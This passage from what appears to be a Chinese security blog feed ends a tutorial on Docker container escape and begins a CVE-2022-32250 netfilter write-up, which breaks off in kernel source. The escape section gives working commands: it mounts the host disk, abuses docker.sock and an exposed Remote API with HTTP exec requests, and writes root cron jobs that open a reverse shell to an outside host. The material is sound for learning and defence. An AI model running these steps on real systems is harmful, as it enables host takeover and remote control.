class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ... ...</span></span><br><span class="line">Disk /dev/sda: 64 GiB, 68719476736 bytes, 134217728 sectors</span><br><span class="line">Disk model: Ubuntu Linux 20.</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 4096 bytes</span><br><span class="line">I/O size (minimum/optimal): 4096 bytes / 4096 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x1f305916</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32</span><br><span class="line">/dev/sda2       1052670 134215679 133163010 63.5G  5 Extended</span><br><span class="line">/dev/sda5       1052672 134215679 133163008 63.5G 83 Linux</span><br><span class="line"><span class="comment"># ... ...</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># mkdir /test</span></span><br><span class="line">root@7fbc86e39373:~<span class="comment"># mount /dev/sda5 /test</span></span><br></pre></td></tr></table></figure><p>最终写入计划任务到宿主机实现反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27;</span> &gt;&gt; /<span class="built_in">test</span>/var/spool/cron/root</span><br></pre></td></tr></table></figure><h3 id="如何判断是否为特权模式"><a href="#如何判断是否为特权模式" class="headerlink" title="如何判断是否为特权模式"></a>如何判断是否为特权模式</h3><p>在suid提权中SUID设置的程序出现漏洞就非常容易被利用，所以 Linux 引入了 Capability 机制以此来实现更加细致的权限控制，从而增加系统的安全性。</p><p>在 <a class="link"   href="https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md" >https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md<i class="fas fa-external-link-alt"></i></a> 链接中汇总了特权模式下添加了什么功能。</p><p>除此之外还需具有以下条件</p><ul><li>必须缺少AppArmor配置文件，否则将允许mount syscall</li><li>能够“看到”很多敏感的dev设备</li></ul><p>上述两个条件目前还不知道如何获取，所以重点看下特权容器中获取的 Cap 集合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~/<span class="built_in">test</span><span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh:0000000000000000</span><br><span class="line">CapPrm:000001ffffffffff</span><br><span class="line">CapEff:000001ffffffffff</span><br><span class="line">CapBnd:000001ffffffffff</span><br><span class="line">CapAmb:0000000000000000</span><br></pre></td></tr></table></figure><p>CapEff 主要是检查线程的执行权限，所以重点看下利用 <code>capsh --decode=0000001fffffffff</code> 进行解码，检索默认没有添加的 NET_ADMIN，发现存在<code>cap_net_admin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~/<span class="built_in">test</span><span class="comment"># capsh --decode=0000001fffffffff</span></span><br><span class="line">0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend</span><br></pre></td></tr></table></figure><p>而非特权容器的 Cap 集合值并进行解码，发现并不存在 NET_ADMIN</p><h3 id="docker-sock-挂载逃逸"><a href="#docker-sock-挂载逃逸" class="headerlink" title="docker.sock 挂载逃逸"></a>docker.sock 挂载逃逸</h3><p>Docker采用C&#x2F;S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon(docker守护进程)扮演，二者之间通信方式有以下3种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unix:///var/run/docker.sock</span><br><span class="line">tcp://host:port</span><br><span class="line">fd://socketfd</span><br></pre></td></tr></table></figure><p>其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载&#x2F;var&#x2F;run&#x2F;docker.sock文件。<br>本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。<br>因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。</p><p>逃逸的方法主要是以下操作：</p><p>运行一个挂载&#x2F;var&#x2F;run&#x2F;的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash</span><br></pre></td></tr></table></figure><p>寻找下挂载的sock文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name docker.sock</span><br></pre></td></tr></table></figure><p>在容器内安装client，即docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install docker.io</span><br></pre></td></tr></table></figure><p>查看宿主机docker信息并运行一个新容器并挂载宿主机根路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock info</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock run -v /:/<span class="built_in">test</span> -it ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure><p>写入计划任务反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27;</span> &gt;&gt; /<span class="built_in">test</span>/var/spool/cron/root</span><br></pre></td></tr></table></figure><h3 id="Remote-API未授权访问"><a href="#Remote-API未授权访问" class="headerlink" title="Remote API未授权访问"></a>Remote API未授权访问</h3><p>docker swarm中默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</p><p>当使用官方推荐启动方式时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure><p>在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。此时访问&#x2F;containers&#x2F;json，便会得到所有容器id字段。创建一个 exec：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/containers/&lt;container_id&gt;/exec</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStdin&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStdout&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStderr&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Cmd&quot;</span>: [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>],</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;DetachKeys&quot;</span>: <span class="string">&quot;ctrl-p,ctrl-q&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Privileged&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Tty&quot;</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>发包后返回exec的id参数</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/exec/&lt;exec_id&gt;/start</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json"> <span class="attr">&quot;Detach&quot;</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="json"> <span class="attr">&quot;Tty&quot;</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>执行exec中的命令，成功读取passwd文件，这种方式只是获取到了docker主机的命令执行权限，但是还无法逃逸到宿主机。因此还是需要写公钥或者计时任务进行逃逸。</p><p>在容器内安装docker，查看宿主机docker镜像信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 images</span><br></pre></td></tr></table></figure><p>启动一个容器并将宿主机根目录挂在到容器的test目录，最后又是写计划任务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 run -it -v /:/<span class="built_in">test</span> 5d2df19066ac /bin/bash</span><br></pre></td></tr></table></figure><h3 id="利用内核漏洞逃逸"><a href="#利用内核漏洞逃逸" class="headerlink" title="利用内核漏洞逃逸"></a>利用内核漏洞逃逸</h3><p>众所周知的是，docker的容器其实是和宿主机公用同一套内核的，所以如果内存出现漏洞是完全可以进行逃逸的，并且在前面的提到的<code>namespace</code>机制我们可以得知的是进程的<code>task_truct</code>中使用的是<code>nsproxy</code>成员实现的隔离机制，如果我们能够修改这个成员那么就可以完成逃逸了。</p><p>这里针对内核提权过程中的两种情况分别给一下对应的解决办法，在以往的<code>kernel pwn</code>中我们最为熟知的两种提权方式是：</p><p>一、 控制程序执行流</p><p>二、 存在任意地址写</p><p>首先是第一种情况，如果可以直接控制rip的话可以直接调用如下函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">switch_task_namespaces</span><span class="params">(struct task_struct *p, struct nsproxy *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> *<span class="title">ns</span>;</span></span><br><span class="line"></span><br><span class="line">might_sleep();</span><br><span class="line"></span><br><span class="line">task_lock(p);</span><br><span class="line">ns = p-&gt;nsproxy;</span><br><span class="line">p-&gt;nsproxy = <span class="keyword">new</span>;</span><br><span class="line">task_unlock(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ns)</span><br><span class="line">put_nsproxy(ns);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过名字和参数可以猜出来该函数的作用就是修改指定<code>task_struct</code>的<code>nsproxy</code>为执行的<code>nsproxy</code>结构体。</p><p>那么第二种情况的时候利用起来也很简单，只需要直接修改当前<code>task_struct</code>的<code>nsproxy</code>为<code>init_proxy</code>即可实现逃逸。</p><hr><p>参考链接：</p><p>​<a class="link"   href="https://xz.aliyun.com/t/12495#toc-3" >https://xz.aliyun.com/t/12495#toc-3<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近期因为工作上的内容比较多压得比较紧所以一直没有去学习新的东西，也没有更新博客。所以最近呢也就挑一个比较简单一点的东西学了一下。在紧跟着的下</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="docker escape" scheme="https://196082.github.io/tags/docker-escape/"/>
    
    <category term="namespace机制" scheme="https://196082.github.io/tags/namespace%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-32250复现</title>
    <link href="https://196082.github.io/2023/09/06/CVE-2022-32250/"/>
    <id>https://196082.github.io/2023/09/06/CVE-2022-32250/</id>
    <published>2023-09-06T01:57:12.000Z</published>
    <updated>2023-11-29T10:11:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作目前面对着一个不怎么熟悉的<code>netfilter</code>这一模块，所以直接复现一个以往的CVE来认识认识这个模块。</p><p>这里介绍这个模块可能不会很好，所以不熟悉的朋友可以去看 <a class="link"   href="https://www.secrss.com/articles/44817" >https://www.secrss.com/articles/44817<i class="fas fa-external-link-alt"></i></a> 这篇文章。</p><h2 id="nftables介绍"><a href="#nftables介绍" class="headerlink" title="nftables介绍"></a>nftables介绍</h2><p><code>nftables</code>取代了流行的<code>&#123;ip,ip6,arp,eb&#125;tables</code>。该软件提供了一个新的内核数据包分类框架，该框架基于特定于网络的虚拟机 (VM) 和新的nft用户空间命令行工具。<code>nftables</code>重用了现有的<code>netfilter</code>子系统，例如现有的钩子基础设施、连接跟踪系统、NAT、用户空间队列和日志子系统。对于<code>nftables</code>，只需要扩展<code>expression</code>即可，用户自行编写<code>expression</code>，然后让<code>nftables</code>虚拟机执行它。<code>nftables</code>框架的数据结构如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Table&#123;</span><br><span class="line">   Chain[</span><br><span class="line">     Rule</span><br><span class="line">       (expression1,expression2,expression3,...)</span><br><span class="line">          | | |--&gt; expression_action</span><br><span class="line">          | |--&gt; expression_action</span><br><span class="line">          |--&gt;expression_action</span><br><span class="line">     Rule</span><br><span class="line">         (expression,expression,expression,...)</span><br><span class="line">     ...</span><br><span class="line">  ],</span><br><span class="line">  Chain[</span><br><span class="line">     ...</span><br><span class="line">  ],</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Table</code>为<code>chain</code>的容器，<code>chain</code>为<code>rule</code>的容器，<code>rule</code>为<code>expression</code>的容器，<code>expression</code>响应<code>action</code>。构造成由 <code>table-&gt;chain-&gt;rule-&gt;expression</code> 四级组成的数据结构。</p><h3 id="nfnetlink初始化"><a href="#nfnetlink初始化" class="headerlink" title="nfnetlink初始化"></a>nfnetlink初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __net_init <span class="title">nfnetlink_net_init</span><span class="params">(struct net *net)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nfnl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_kernel_cfg</span> <span class="title">cfg</span> =</span> &#123;</span><br><span class="line">.groups= NFNLGRP_MAX,</span><br><span class="line">.input= nfnetlink_rcv,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">.bind= nfnetlink_bind,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">nfnl = netlink_kernel_create(net, NETLINK_NETFILTER, &amp;cfg);</span><br><span class="line"><span class="keyword">if</span> (!nfnl)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">net-&gt;nfnl_stash = nfnl;</span><br><span class="line">rcu_assign_pointer(net-&gt;nfnl, nfnl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>nfnetlink_net_init</code>函数中定义了<code>netlink_kernel_cfg</code>结构，并传给了<code>netlink_kernel_create</code>进行创建。在后续接收消息的时候就会调用<code>nfnetlink_rcv</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> nlmsg_hdr(skb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!netlink_net_capable(skb, CAP_NET_ADMIN)) &#123;</span><br><span class="line">netlink_ack(skb, nlh, -EPERM, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_type == NFNL_MSG_BATCH_BEGIN)</span><br><span class="line">nfnetlink_rcv_skb_batch(skb, nlh);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">netlink_rcv_skb(skb, nfnetlink_rcv_msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中需要<code>CAP_NET_ADMIN</code>才能访问，如果编译时开启了<code>CONFIG_USER_NS</code>那么普通用户也是可以访问的。</p><p><img   src="/images/6ac5d3cf17c1409d62d979bf0ee4fa12.png" ></p><p>以上就是<code>nfnetlink</code>接收消息的完整调用链了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv_batch</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">u16 subsys_id, u32 genid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">oskb</span> =</span> skb;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> *<span class="title">ss</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> *<span class="title">nc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> <span class="title">extack</span>;</span></span><br><span class="line">LIST_HEAD(err_list);</span><br><span class="line">u32 status;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (subsys_id &gt;= NFNL_SUBSYS_COUNT)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(skb, nlh, -EINVAL, <span class="literal">NULL</span>);</span><br><span class="line">replay:</span><br><span class="line">status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">skb = netlink_skb_clone(oskb, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!skb)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(oskb, nlh, -ENOMEM, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">nfnl_lock(subsys_id);</span><br><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br><span class="line"><span class="keyword">if</span> (!ss) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">request_module(<span class="string">&quot;nfnetlink-subsys-%d&quot;</span>, subsys_id);</span><br><span class="line">nfnl_lock(subsys_id);</span><br><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br><span class="line"><span class="keyword">if</span> (!ss)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss-&gt;valid_genid || !ss-&gt;commit || !ss-&gt;<span class="built_in">abort</span>) &#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ss-&gt;owner)) &#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss-&gt;valid_genid(net, genid)) &#123;</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -ERESTART, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span 